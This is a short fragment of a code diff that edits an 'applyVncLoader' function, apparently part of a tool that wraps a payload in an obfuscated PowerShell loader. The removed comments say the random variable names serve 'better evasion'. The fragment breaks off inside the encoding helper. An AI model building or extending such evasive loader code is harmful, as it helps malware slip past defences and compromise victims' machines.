@@ -1313,16 +1313,14 @@ try {
 }
 
 // Replace the applyVncLoader function with a more advanced loader
-function applyVncLoader(payload) {
-  // Generate random variable names for better evasion
-  function randVar(len = 6) {
+function applyVncLoader(payload: string) {
+  function randVar(len = 6): string {
     const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
     let out = '';
     for (let i = 0; i < len; i++) out += chars[Math.floor(Math.random() * chars.length)];
     return out;
   }
-  // Proper UTF-16LE to base64 encoding for PowerShell
-  function toBase64Unicode(str) {
+  function toBase64Unicode(str: string): string {
     const utf16le = new Uint8Array(str.length * 2);
     for (let i = 0; i < str.length; i++) {
       const code = str.charCodeAt(i);
